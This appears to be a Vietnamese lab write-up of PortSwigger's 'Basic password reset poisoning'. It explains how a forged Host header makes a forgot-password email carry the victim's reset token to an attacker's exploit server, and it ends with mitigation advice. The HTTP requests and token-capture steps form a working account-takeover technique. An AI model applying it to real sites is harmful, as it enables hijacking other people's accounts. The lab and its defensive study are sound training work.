---
title: "[PortSwigger] Lab 1: Basic Password Reset Poisoning"
date: 2026-09-14
description: "Khai thác lỗ hổng Password Reset Poisoning thông qua việc can thiệp giá trị header Host để chiếm đoạt token đặt lại mật khẩu của người dùng."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 1
showAuthor: false
showTableOfContents: true
---

## 📌 Thông tin bài Lab
* **Tên bài Lab**: Basic password reset poisoning
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Practitioner
* **Mục tiêu**: Đăng nhập thành công vào tài khoản của người dùng `carlos` bằng cách chiếm đoạt token đặt lại mật khẩu của họ.

---

## 1. Mô tả bài toán & Trinh sát (Reconnaissance)

Ứng dụng web cung cấp tính năng quên mật khẩu (*Forgot Password*). Khi người dùng gửi yêu cầu đặt lại mật khẩu, hệ thống sẽ gửi một email chứa đường dẫn đặt lại mật khẩu kèm token bí mật.

### Kiểm tra gói tin gửi yêu cầu đặt lại mật khẩu:
Bắt request trong **Burp Suite**:
```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

username=carlos
```

Nhận thấy ứng dụng không validate header `Host` mà sử dụng trực tiếp giá trị này để tạo đường dẫn link reset password gửi vào email nạn nhân.

---

## 2. Cơ chế phát sinh lỗ hổng

Hệ thống backend sử dụng giá trị từ header `Host` do client gửi lên để sinh URL tuyệt đối (Absolute URL) cho liên kết đặt lại mật khẩu:

```php
$reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset-password?token=" . $token;
```

Do không có danh sách máy chủ được phép (whitelist validation), kẻ tấn công có thể thay thế header `Host` bằng domain máy chủ khai thác do mình kiểm soát (Exploit Server). Khi nạn nhân click vào liên kết trong email, token bí mật sẽ được gửi thẳng đến Access Log của máy chủ kẻ tấn công.

---

## 3. Khai thác lỗ hổng (PoC Step-by-Step)

### Bước 1: Chuẩn bị máy chủ Exploit Server
Mở **Exploit Server** được cung cấp bởi bài lab và sao chép địa chỉ domain:
```text
exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

### Bước 2: Gửi gói tin can thiệp header Host
Trong Burp Repeater, thay đổi giá trị header `Host` thành domain của Exploit Server và gửi yêu cầu reset mật khẩu cho tài khoản `carlos`:

```http
POST /forgot-password HTTP/1.1
Host: exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

username=carlos
```

Gửi request và nhận phản hồi `200 OK`. Lúc này, hệ thống đã gửi email đến `carlos` với đường dẫn trỏ tới Exploit Server của chúng ta.

### Bước 3: Lấy Token từ Access Log
Chuyển sang tab **Access Log** trên Exploit Server. Ta thấy một request từ nạn nhân:
```text
GET /reset-password?token=abcdef1234567890xyz HTTP/1.1
```

Sao chép chuỗi `token` này.

### Bước 4: Đặt lại mật khẩu và hoàn thành bài Lab
Truy cập đường dẫn reset password thực tế trên trang lab kèm token vừa chiếm được:
```text
https://YOUR-LAB-ID.web-security-academy.net/reset-password?token=abcdef1234567890xyz
```
Nhập mật khẩu mới và tiến hành đăng nhập với tài khoản `carlos`. Bài lab được giải quyết thành công!

---

## 4. Biện pháp khắc phục (Mitigation)

* **Không sử dụng header `Host` để tạo URL nhạy cảm**: Cấu hình giá trị domain tuyệt đối cố định trong file cấu hình của ứng dụng (ví dụ: `APP_URL` trong file `.env`).
* **Sử dụng Server Name cố định**: Trên Nginx/Apache, cấu hình web server bỏ qua hoặc từ chối các request có header `Host` không nằm trong danh sách `server_name` hợp lệ:
  ```nginx
  server {
      listen 80 default_server;
      return 444; # Từ chối request không hợp lệ
  }
  ```
